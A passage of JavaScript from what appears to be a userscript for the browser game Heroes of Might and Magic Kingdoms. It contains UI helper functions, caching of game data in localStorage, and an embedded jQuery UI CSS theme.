		xmlhttp.setRequestHeader("X-Request", "JSON");
		xmlhttp.send('json='+JSON.stringify(json));
		var result = JSON.parse(xmlhttp.responseText);
		processReturnData( result );
		return result;
	}
	HOMMK_user.func.doSyncRequest = do_request_sync;
	
	function  getStyleStringForImage( name, param ) {		
		var imageData = document.createElement("div");
		HOMMK.setCssSpriteBackground( imageData, name, param );
		var tmpPath = "";
		if ( imageData.attributes[0] ) {
			tmpPath = imageData.attributes[0].value.replace(/"/g, "" );
		}
		else {	// Simplified for Chrome. Not all functions
			var c=HOMMK.CSSSPRITE_CONF[name];
			var k=c.sprites[param];
			var f=k.x;
			var a=k.y;
			var h=HOMMK.IMG_URL+"css_sprite/"+(c.file?c.file:name)+"."+c.ext;
			if(f==0&&a==0) {
				f=c.width;
				a=c.height
			}
			var tmpPath = 'background-image: url('+h+'); background-position: -'+f+'px -'+a+'px; background-repeat:repeat;width:'+k.w+'px;height:'+k.h+'px;';
		}
		return tmpPath;
	}
	HOMMK_user.func.getStyleStringForImage = getStyleStringForImage;
	
	function intToStringApostrophe( levelStrength ) {
		var levelStrengthStrS = '' + levelStrength;
		var strokePos = levelStrengthStrS.length - Math.floor( levelStrengthStrS.length / 3 ) * 3;
		strokePos = strokePos == 0 ? 2 : strokePos - 1;
		var levelStrengthStrR = '';
		for ( var pos = 0; pos < levelStrengthStrS.length; pos++ ) {
			levelStrengthStrR += levelStrengthStrS.charAt( pos );
			if ( pos == strokePos && pos != levelStrengthStrS.length-1 ) {
				strokePos += 3;
				levelStrengthStrR += '\'';
			}
		}
		return levelStrengthStrR;
	}
	HOMMK_user.func.intToStringApostrophe = intToStringApostrophe;
	
	function getSubNodeWithId( baseNode, searchedId ) {
		for ( var i in baseNode.childNodes ) {
			if ( baseNode.childNodes[i].id == searchedId )
				return baseNode.childNodes[i];
		}
		return baseNode;
	}
	HOMMK_user.func.getSubNodeWithId = getSubNodeWithId;
	//-----------------------------------------------------------
	//-----------------------------------------------------------
	
	String.prototype.setLength = function(l){
		if(this.length <2)
			return "0"+this;
		return this;
	};
	
	function getScript(u){
		var s = document.createElement('script');
		s.src = u;
		document.getElementsByTagName('head')[0].appendChild(s);
	}
	function format(num,base,len){
		var base = base || 10;
		var len = len || 2;
		var num = parseInt(num,10);
		var str = num.toString(base);
		while(str.length<len){
			str = "0" + str;
		}
		//console.log("color: "+str);
		return str;
	}
	function format_milles(num,separator){
		separator = separator || ",";
		num = num.toString().split('.');
		return num[0].replace(/(\d)(?=(?:\d{3})+(?:$))/g, '$1'+separator) + (num[1]?'.'+num[1]:'');
	}
	
	function getColor(c,t){
		function doIt(d,e){
			e = 1;
			//console.log(d);
			//console.log(255-((255-d)*e));
			return format(Math.min(255-((255-d)*e),255),16)
			//return format(c,16)
		}
		var t = t || 0;
		var palette = [
			255,89,0, //0
			255,137,0,
			255,192,0,
			250,219,1,
			221,221,0,
			186,248,9,
			128,228,16,
			76,207,26,
			0,190,100,
			0,207,144,
			0,224,245,
			0,188,235,
			0,151,225, // 12
			0,93,191,  // 13
			0,42,162,
			16,4,147,
			73,1,160,
			97,0,166,
			138,0,179,
			179,0,192,
			248,0,189,
			255,0,23 //21
		];
		var r = "#"+doIt(palette[c*3+0],t)+doIt(palette[c*3+1],t)+doIt(palette[c*3+2],t);
		//console.log(r);
		return r;
	}
	
	HOMMK_user.setTitle = function(selector,title){
		//console.log(selector,title);
		$(selector).attr('title',title);
	};
	
	HOMMK_user.setClickable = function(msg,player,alliance,x,y){
		x=parseInt(x),y=parseInt(y);
		$("#m"+msg).find(".scoutingResultHeader").next().children(':nth-child(2)').children(':nth-child(2)').click(function(){HOMMK.openPlayerProfileFrame(player);});
		if(alliance){
			$("#m"+msg).find(".scoutingResultHeader").next().children(':nth-child(3)').children(':nth-child(2)').click(function(){w.openAllianceFrame(alliance);});
			$("#m"+msg).find(".scoutingResultHeader").next().children(':nth-child(4)').children(':nth-child(2)').click(function(){HOMMK.worldMap.center(x,y);});
		}
		else{
			$("#m"+msg).find(".scoutingResultHeader").next().children(':nth-child(3)').children(':nth-child(2)').click(function(){HOMMK.worldMap.center(x,y);});
		}
	};
	
	
	var worldId = HOMMK.player.content.worldId;
	var playerId = HOMMK.player.content.id;
	var allianceId = HOMMK.player.content.allianceId;
	var cache = localStorage_getObject('cache_'+worldId+'_'+playerId,{});
	
	function saveCache(/*type,id,obj*/){
		/*if(type){
			//var cache = localStorage_getObject('cache',{});
			cache[type] = cache[type] || {};
			cache[type][id] = obj;
		}*/
		localStorage_setObject('cache_'+worldId+'_'+playerId,cache);
		//console.log(cache);
	}

	function getId(name,category){
		return name.substring(category.length);
	}

	function getType(name,category){
		return name.substring(0,category.length);
	}
	
	
	function handle(responses,time,update){
		//console.log(arguments);
		//if(update
		var obj,id,type,toBeSaved = '|RecruitmentFrame|MagicGuildFrame'.split('|');
		var LEN = 8;
		for(var i in responses){
			console.log(i,responses[i]);
			obj = responses[i];
			switch(i.substring(0,LEN)){
				case 'CityView'.substring(0,LEN):
					break;
				case 'MagicGuildFrame'.substring(0,LEN):
					id = getId(i,'MagicGuildFrame');
					cache.skills = cache.skills || {};
					cache.citySkills = cache.citySkills || {};
					cache.citySkills[id] = [[],time];
					for(var j=0;j<obj.spellStackList.length;j++){
						var sk = obj.spellStackList[j];
						cache.skills[sk.spellEntityTagName] = [sk,time];
						cache.citySkills[id][0].push(sk.spellEntityTagName);
					}
					saveCache();
					break;
				case 'MarketPlaceFrame'.substring(0,LEN):
				/*	id = getId(i,'MarketPlaceFrame');
					save('cityArtefactList',id,obj.cityArtefactList);*/
					break;
				case 'MessageBoxFrame'.substring(0,LEN):
					break;
				case 'ProfileFrame'.substring(0,LEN):
					/*id = getId(i,'ProfileFrame');
					if(id != HOMMK.player.content.id)
						break;
					save();*/
					break;
				case 'RecruitmentFrame'.substring(0,LEN):
				/*	id = getId(i,'RecruitmentFrame');
					save('cityRecruitmentList',id,obj.recruitableUnitList);*/
					break;
					
			}
			//save(type,id,responses[i]);
		}
	}

(function(){
	/* 	* jQuery UI CSS Framework @VERSION * 
		* Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) 
		* Dual licensed under the MIT or GPL Version 2 licenses. 
		* http://jquery.org/license * 
		* http://docs.jquery.com/UI/Theming/API */
	/* Layout helpers----------------------------------*/
	addStyle('.ui-helper-hidden { display: none; }.ui-helper-hidden-accessible { position: absolute; left: -99999999px; }.ui-helper-reset { margin: 0; padding: 0; border: 0; outline: 0; line-height: 1.3; text-decoration: none; font-size: 100%; list-style: none; }.ui-helper-clearfix:after { content: "."; display: block; height: 0; clear: both; visibility: hidden; }.ui-helper-clearfix { display: inline-block; }/* required comment for clearfix to work in Opera \*/* html .ui-helper-clearfix { height:1%; }.ui-helper-clearfix { display:block; }/* end clearfix */.ui-helper-zfix { width: 100%; height: 100%; top: 0; left: 0; position: absolute; opacity: 0; filter:Alpha(Opacity=0); }/* Interaction Cues----------------------------------*/.ui-state-disabled { cursor: default !important; }/* Icons----------------------------------*//* states and images */.ui-icon { display: block; text-indent: -99999px; overflow: hidden; background-repeat: no-repeat; }/* Misc visuals----------------------------------*//* Overlays */.ui-widget-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }/* * jQuery UI CSS Framework @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Theming/API * * To view and modify this theme, visit http://jqueryui.com/themeroller/?ffDefault=Segoe%20UI,%20Arial,%20sans-serif&fwDefault=bold&fsDefault=1.1em&cornerRadius=6px&bgColorHeader=333333&bgTextureHeader=12_gloss_wave.png&bgImgOpacityHeader=25&borderColorHeader=333333&fcHeader=ffffff&iconColorHeader=ffffff&bgColorContent=000000&bgTextureContent=05_inset_soft.png&bgImgOpacityContent=25&borderColorContent=666666&fcContent=ffffff&iconColorContent=cccccc&bgColorDefault=555555&bgTextureDefault=02_glass.png&bgImgOpacityDefault=20&borderColorDefault=666666&fcDefault=eeeeee&iconColorDefault=cccccc&bgColorHover=0078a3&bgTextureHover=02_glass.png&bgImgOpacityHover=40&borderColorHover=59b4d4&fcHover=ffffff&iconColorHover=ffffff&bgColorActive=f58400&bgTextureActive=05_inset_soft.png&bgImgOpacityActive=30&borderColorActive=ffaf0f&fcActive=ffffff&iconColorActive=222222&bgColorHighlight=eeeeee&bgTextureHighlight=03_highlight_soft.png&bgImgOpacityHighlight=80&borderColorHighlight=cccccc&fcHighlight=2e7db2&iconColorHighlight=4b8e0b&bgColorError=ffc73d&bgTextureError=02_glass.png&bgImgOpacityError=40&borderColorError=ffb73d&fcError=111111&iconColorError=a83300&bgColorOverlay=5c5c5c&bgTextureOverlay=01_flat.png&bgImgOpacityOverlay=50&opacityOverlay=80&bgColorShadow=cccccc&bgTextureShadow=01_flat.png&bgImgOpacityShadow=30&opacityShadow=60&thicknessShadow=7px&offsetTopShadow=-7px&offsetLeftShadow=-7px&cornerRadiusShadow=8px *//* Component containers----------------------------------*/.ui-widget { font-family: arial,verdana,sans-serif; font-size: 12px; }.ui-widget .ui-widget { font-size: 1em; }.ui-widget input, .ui-widget select, .ui-widget textarea, .ui-widget button { font-family: arial,verdana,sans-serif; font-size: 12px; }.ui-widget-content { border: 1px solid #666666;  background: rgba(0,0,0,0.75); color: #c0c0c0; }.ui-widget-content a { color: #ffffff; }.ui-widget-header { color: #ffffff; font-weight: bold; }.ui-widget-header a { color: #ffffff; }/* Interaction states----------------------------------*/.ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header .ui-state-default { border: 1px solid #666666; background: #555555 ; font-weight: bold; color: #eeeeee; }.ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited { color: #eeeeee; text-decoration: none; }.ui-state-hover, .ui-widget-content .ui-state-hover, .ui-widget-header .ui-state-hover, .ui-state-focus, .ui-widget-content .ui-state-focus, .ui-widget-header .ui-state-focus { border: 1px solid #59b4d4; background: #0078a3; font-weight: bold; color: #ffffff; }.ui-state-hover a, .ui-state-hover a:hover { color: #ffffff; text-decoration: none; }.ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active { border: 1px solid #ffaf0f; background: #f58400; font-weight: bold; color: #ffffff; }.ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited { color: #ffffff; text-decoration: none; }.ui-widget :active { outline: none; }/* Interaction Cues----------------------------------*/.ui-state-highlight, .ui-widget-content .ui-state-highlight, .ui-widget-header .ui-state-highlight  {border: 1px solid #cccccc; background: #eeeeee ; color: #2e7db2; }.ui-state-highlight a, .ui-widget-content .ui-state-highlight a,.ui-widget-header .ui-state-highlight a { color: #2e7db2; }.ui-state-error, .ui-widget-content .ui-state-error, .ui-widget-header .ui-state-error {border: 1px solid #ffb73d; background: #ffc73d ; color: #111111; }.ui-state-error a, .ui-widget-content .ui-state-error a, .ui-widget-header .ui-state-error a { color: #111111; }.ui-state-error-text, .ui-widget-content .ui-state-error-text, .ui-widget-header .ui-state-error-text { color: #111111; }.ui-priority-primary, .ui-widget-content .ui-priority-primary, .ui-widget-header .ui-priority-primary { font-weight: bold; }.ui-priority-secondary, .ui-widget-content .ui-priority-secondary,  .ui-widget-header .ui-priority-secondary { opacity: .7; filter:Alpha(Opacity=70); font-weight: normal; }.ui-state-disabled, .ui-widget-content .ui-state-disabled, .ui-widget-header .ui-state-disabled { opacity: .35; filter:Alpha(Opacity=35); background-image: none; }/* Icons----------------------------------*//* states and images */.ui-icon { width: 16px; height: 16px; background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-widget-content .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-widget-header .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_ffffff_256x240.png); }.ui-state-default .ui-icon { background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_cccccc_256x240.png); }.ui-state-hover .ui-icon, .ui-state-focus .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_ffffff_256x240.png); }.ui-state-active .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_222222_256x240.png); }.ui-state-highlight .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_4b8e0b_256x240.png); }.ui-state-error .ui-icon, .ui-state-error-text .ui-icon {background-image: url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-icons_a83300_256x240.png); }/* positioning */.ui-icon-carat-1-n { background-position: 0 0; }.ui-icon-carat-1-ne { background-position: -16px 0; }.ui-icon-carat-1-e { background-position: -32px 0; }.ui-icon-carat-1-se { background-position: -48px 0; }.ui-icon-carat-1-s { background-position: -64px 0; }.ui-icon-carat-1-sw { background-position: -80px 0; }.ui-icon-carat-1-w { background-position: -96px 0; }.ui-icon-carat-1-nw { background-position: -112px 0; }.ui-icon-carat-2-n-s { background-position: -128px 0; }.ui-icon-carat-2-e-w { background-position: -144px 0; }.ui-icon-triangle-1-n { background-position: 0 -16px; }.ui-icon-triangle-1-ne { background-position: -16px -16px; }.ui-icon-triangle-1-e { background-position: -32px -16px; }.ui-icon-triangle-1-se { background-position: -48px -16px; }.ui-icon-triangle-1-s { background-position: -64px -16px; }.ui-icon-triangle-1-sw { background-position: -80px -16px; }.ui-icon-triangle-1-w { background-position: -96px -16px; }.ui-icon-triangle-1-nw { background-position: -112px -16px; }.ui-icon-triangle-2-n-s { background-position: -128px -16px; }.ui-icon-triangle-2-e-w { background-position: -144px -16px; }.ui-icon-arrow-1-n { background-position: 0 -32px; }.ui-icon-arrow-1-ne { background-position: -16px -32px; }.ui-icon-arrow-1-e { background-position: -32px -32px; }.ui-icon-arrow-1-se { background-position: -48px -32px; }.ui-icon-arrow-1-s { background-position: -64px -32px; }.ui-icon-arrow-1-sw { background-position: -80px -32px; }.ui-icon-arrow-1-w { background-position: -96px -32px; }.ui-icon-arrow-1-nw { background-position: -112px -32px; }.ui-icon-arrow-2-n-s { background-position: -128px -32px; }.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }.ui-icon-arrow-2-e-w { background-position: -160px -32px; }.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }.ui-icon-arrowstop-1-n { background-position: -192px -32px; }.ui-icon-arrowstop-1-e { background-position: -208px -32px; }.ui-icon-arrowstop-1-s { background-position: -224px -32px; }.ui-icon-arrowstop-1-w { background-position: -240px -32px; }.ui-icon-arrowthick-1-n { background-position: 0 -48px; }.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }.ui-icon-arrowthick-1-e { background-position: -32px -48px; }.ui-icon-arrowthick-1-se { background-position: -48px -48px; }.ui-icon-arrowthick-1-s { background-position: -64px -48px; }.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }.ui-icon-arrowthick-1-w { background-position: -96px -48px; }.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }.ui-icon-arrow-4 { background-position: 0 -80px; }.ui-icon-arrow-4-diag { background-position: -16px -80px; }.ui-icon-extlink { background-position: -32px -80px; }.ui-icon-newwin { background-position: -48px -80px; }.ui-icon-refresh { background-position: -64px -80px; }.ui-icon-shuffle { background-position: -80px -80px; }.ui-icon-transfer-e-w { background-position: -96px -80px; }.ui-icon-transferthick-e-w { background-position: -112px -80px; }.ui-icon-folder-collapsed { background-position: 0 -96px; }.ui-icon-folder-open { background-position: -16px -96px; }.ui-icon-document { background-position: -32px -96px; }.ui-icon-document-b { background-position: -48px -96px; }.ui-icon-note { background-position: -64px -96px; }.ui-icon-mail-closed { background-position: -80px -96px; }.ui-icon-mail-open { background-position: -96px -96px; }.ui-icon-suitcase { background-position: -112px -96px; }.ui-icon-comment { background-position: -128px -96px; }.ui-icon-person { background-position: -144px -96px; }.ui-icon-print { background-position: -160px -96px; }.ui-icon-trash { background-position: -176px -96px; }.ui-icon-locked { background-position: -192px -96px; }.ui-icon-unlocked { background-position: -208px -96px; }.ui-icon-bookmark { background-position: -224px -96px; }.ui-icon-tag { background-position: -240px -96px; }.ui-icon-home { background-position: 0 -112px; }.ui-icon-flag { background-position: -16px -112px; }.ui-icon-calendar { background-position: -32px -112px; }.ui-icon-cart { background-position: -48px -112px; }.ui-icon-pencil { background-position: -64px -112px; }.ui-icon-clock { background-position: -80px -112px; }.ui-icon-disk { background-position: -96px -112px; }.ui-icon-calculator { background-position: -112px -112px; }.ui-icon-zoomin { background-position: -128px -112px; }.ui-icon-zoomout { background-position: -144px -112px; }.ui-icon-search { background-position: -160px -112px; }.ui-icon-wrench { background-position: -176px -112px; }.ui-icon-gear { background-position: -192px -112px; }.ui-icon-heart { background-position: -208px -112px; }.ui-icon-star { background-position: -224px -112px; }.ui-icon-link { background-position: -240px -112px; }.ui-icon-cancel { background-position: 0 -128px; }.ui-icon-plus { background-position: -16px -128px; }.ui-icon-plusthick { background-position: -32px -128px; }.ui-icon-minus { background-position: -48px -128px; }.ui-icon-minusthick { background-position: -64px -128px; }.ui-icon-close { background-position: -80px -128px; }.ui-icon-closethick { background-position: -96px -128px; }.ui-icon-key { background-position: -112px -128px; }.ui-icon-lightbulb { background-position: -128px -128px; }.ui-icon-scissors { background-position: -144px -128px; }.ui-icon-clipboard { background-position: -160px -128px; }.ui-icon-copy { background-position: -176px -128px; }.ui-icon-contact { background-position: -192px -128px; }.ui-icon-image { background-position: -208px -128px; }.ui-icon-video { background-position: -224px -128px; }.ui-icon-script { background-position: -240px -128px; }.ui-icon-alert { background-position: 0 -144px; }.ui-icon-info { background-position: -16px -144px; }.ui-icon-notice { background-position: -32px -144px; }.ui-icon-help { background-position: -48px -144px; }.ui-icon-check { background-position: -64px -144px; }.ui-icon-bullet { background-position: -80px -144px; }.ui-icon-radio-off { background-position: -96px -144px; }.ui-icon-radio-on { background-position: -112px -144px; }.ui-icon-pin-w { background-position: -128px -144px; }.ui-icon-pin-s { background-position: -144px -144px; }.ui-icon-play { background-position: 0 -160px; }.ui-icon-pause { background-position: -16px -160px; }.ui-icon-seek-next { background-position: -32px -160px; }.ui-icon-seek-prev { background-position: -48px -160px; }.ui-icon-seek-end { background-position: -64px -160px; }.ui-icon-seek-start { background-position: -80px -160px; }/* ui-icon-seek-first is deprecated, use ui-icon-seek-start instead */.ui-icon-seek-first { background-position: -80px -160px; }.ui-icon-stop { background-position: -96px -160px; }.ui-icon-eject { background-position: -112px -160px; }.ui-icon-volume-off { background-position: -128px -160px; }.ui-icon-volume-on { background-position: -144px -160px; }.ui-icon-power { background-position: 0 -176px; }.ui-icon-signal-diag { background-position: -16px -176px; }.ui-icon-signal { background-position: -32px -176px; }.ui-icon-battery-0 { background-position: -48px -176px; }.ui-icon-battery-1 { background-position: -64px -176px; }.ui-icon-battery-2 { background-position: -80px -176px; }.ui-icon-battery-3 { background-position: -96px -176px; }.ui-icon-circle-plus { background-position: 0 -192px; }.ui-icon-circle-minus { background-position: -16px -192px; }.ui-icon-circle-close { background-position: -32px -192px; }.ui-icon-circle-triangle-e { background-position: -48px -192px; }.ui-icon-circle-triangle-s { background-position: -64px -192px; }.ui-icon-circle-triangle-w { background-position: -80px -192px; }.ui-icon-circle-triangle-n { background-position: -96px -192px; }.ui-icon-circle-arrow-e { background-position: -112px -192px; }.ui-icon-circle-arrow-s { background-position: -128px -192px; }.ui-icon-circle-arrow-w { background-position: -144px -192px; }.ui-icon-circle-arrow-n { background-position: -160px -192px; }.ui-icon-circle-zoomin { background-position: -176px -192px; }.ui-icon-circle-zoomout { background-position: -192px -192px; }.ui-icon-circle-check { background-position: -208px -192px; }.ui-icon-circlesmall-plus { background-position: 0 -208px; }.ui-icon-circlesmall-minus { background-position: -16px -208px; }.ui-icon-circlesmall-close { background-position: -32px -208px; }.ui-icon-squaresmall-plus { background-position: -48px -208px; }.ui-icon-squaresmall-minus { background-position: -64px -208px; }.ui-icon-squaresmall-close { background-position: -80px -208px; }.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }.ui-icon-grip-solid-vertical { background-position: -32px -224px; }.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }.ui-icon-grip-diagonal-se { background-position: -80px -224px; }/* Misc visuals----------------------------------*//* Corner radius */.ui-corner-tl { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; }.ui-corner-tr { -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; }.ui-corner-bl { -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; }.ui-corner-br { -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-top { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; }.ui-corner-bottom { -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-right {  -moz-border-radius-topright: 6px; -webkit-border-top-right-radius: 6px; border-top-right-radius: 6px; -moz-border-radius-bottomright: 6px; -webkit-border-bottom-right-radius: 6px; border-bottom-right-radius: 6px; }.ui-corner-left { -moz-border-radius-topleft: 6px; -webkit-border-top-left-radius: 6px; border-top-left-radius: 6px; -moz-border-radius-bottomleft: 6px; -webkit-border-bottom-left-radius: 6px; border-bottom-left-radius: 6px; }.ui-corner-all { -moz-border-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px; }/* Overlays */.ui-widget-overlay { background: #5c5c5c url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-bg_flat_50_5c5c5c_40x100.png) 50% 50% repeat-x; opacity: .80;filter:Alpha(Opacity=80); }.ui-widget-shadow { margin: -7px 0 0 -7px; padding: 7px; background: #cccccc url(http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.4/themes/ui-darkness/images/ui-bg_flat_30_cccccc_40x100.png) 50% 50% repeat-x; opacity: .60;filter:Alpha(Opacity=60); -moz-border-radius: 8px; -webkit-border-radius: 8px; border-radius: 8px; }/* * jQuery UI Resizable @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Resizable#theming */.ui-resizable { position: relative;}.ui-resizable-handle { position: absolute;font-size: 0.1px;z-index: 99999; display: block;}.ui-resizable-disabled .ui-resizable-handle, .ui-resizable-autohide .ui-resizable-handle { display: none; }.ui-resizable-n { cursor: n-resize; height: 7px; width: 100%; top: -5px; left: 0; }.ui-resizable-s { cursor: s-resize; height: 7px; width: 100%; bottom: -5px; left: 0; }.ui-resizable-e { cursor: e-resize; width: 7px; right: -5px; top: 0; height: 100%; }.ui-resizable-w { cursor: w-resize; width: 7px; left: -5px; top: 0; height: 100%; }.ui-resizable-se { cursor: se-resize; width: 12px; height: 12px; right: 1px; bottom: 1px; }.ui-resizable-sw { cursor: sw-resize; width: 9px; height: 9px; left: -5px; bottom: -5px; }.ui-resizable-nw { cursor: nw-resize; width: 9px; height: 9px; left: -5px; top: -5px; }.ui-resizable-ne { cursor: ne-resize; width: 9px; height: 9px; right: -5px; top: -5px;}/* * jQuery UI Selectable @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Selectable#theming */.ui-selectable-helper { position: absolute; z-index: 100; border:1px dotted black; }/* * jQuery UI Accordion @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Accordion#theming *//* IE/Win - Fix animation bug - #4615 */.ui-accordion { width: 100%; }.ui-accordion .ui-accordion-header { cursor: pointer; position: relative; margin-top: 1px; zoom: 1; }.ui-accordion .ui-accordion-li-fix { display: inline; }.ui-accordion .ui-accordion-header-active { border-bottom: 0 !important; }.ui-accordion .ui-accordion-header a { display: block; font-size: 1em; padding: .5em .5em .5em .7em; }.ui-accordion-icons .ui-accordion-header a { padding-left: 2.2em; }.ui-accordion .ui-accordion-header .ui-icon { position: absolute; left: .5em; top: 50%; margin-top: -8px; }.ui-accordion .ui-accordion-content { padding: 1em 2.2em; border-top: 0; margin-top: -2px; position: relative; top: 1px; margin-bottom: 2px; overflow: auto; display: none; zoom: 1; }.ui-accordion .ui-accordion-content-active { display: block; }/* * jQuery UI Autocomplete @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Autocomplete#theming */.ui-autocomplete { position: absolute; cursor: default; }	/* workarounds */* html .ui-autocomplete { width:1px; } /* without this, the menu expands to 100% in IE6 *//* * jQuery UI Menu @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Menu#theming */.ui-menu {	list-style:none;	padding: 2px;	margin: 0;	display:block;	float: left;}.ui-menu .ui-menu {	margin-top: -3px;}.ui-menu .ui-menu-item {	margin:0;	padding: 0;	zoom: 1;	float: left;	clear: left;	width: 100%;}.ui-menu .ui-menu-item a {	text-decoration:none;	display:block;	padding:.2em .4em;	line-height:1.5;	zoom:1;}.ui-menu .ui-menu-item a.ui-state-hover,.ui-menu .ui-menu-item a.ui-state-active {	font-weight: normal;	margin: -1px;}/* * jQuery UI Button @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or GPL Version 2 licenses. * http://jquery.org/license * * http://docs.jquery.com/UI/Button#theming */.ui-button { display: inline-block; position: relative; padding: 0; margin-right: .1em; text-decoration: none !important; cursor: pointer; text-align: center; zoom: 1; overflow: visible; } /* the overflow property removes extra width in IE */.ui-button-icon-only { width: 2.2em; } /* to make room for the icon, a width needs to be set here */button.ui-button-icon-only { width: 2.4em; } /* button elements seem to need a little more width */.ui-button-icons-only { width: 3.4em; } button.ui-button-icons-only { width: 3.7em; } /*button text element */.ui-button .ui-button-text { display: block; line-height: 1.4;  }.ui-button-text-only .ui-button-text { padding: .4em 1em; }.ui-button-icon-only .ui-button-text, .ui-button-icons-only .ui-button-text { padding: .4em; text-indent: -9999999px; }.ui-button-text-icon-primary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 1em .4em 2.1em; }.ui-button-text-icon-secondary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 2.1em .4em 1em; }.ui-button-text-icons .ui-button-text { padding-left: 2.1em; padding-right: 2.1em; }/* no icon support for input elements, provide padding by default */input.ui-button { padding: .4em 1em; }/*button icon element(s) */.ui-button-icon-only .ui-icon, .ui-button-text-icon-primary .ui-icon, .ui-button-text-icon-secondary .ui-icon, .ui-button-text-icons .ui-icon, .ui-button-icons-only .ui-icon { position: absolute; top: 50%; margin-top: -8px; }.ui-button-icon-only .ui-icon { left: 50%; margin-left: -8px; }.ui-button-text-icon-primary .ui-button-icon-primary, .ui-button-text-icons .ui-button-icon-primary, .ui-button-icons-only .ui-button-icon-primary { left: .5em; }.ui-button-text-icon-secondary .ui-button-icon-secondary, .ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }.ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }/*button sets*/.ui-buttonset { margin-right: 7px; }.ui-buttonset .ui-button { margin-left: 0; margin-right: -.3em; }/* workarounds */button.ui-button::-moz-focus-inner { border: 0; padding: 0; } /* reset extra padding in Firefox *//* * jQuery UI Dialog @VERSION * * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about) * Dual licensed under the MIT or 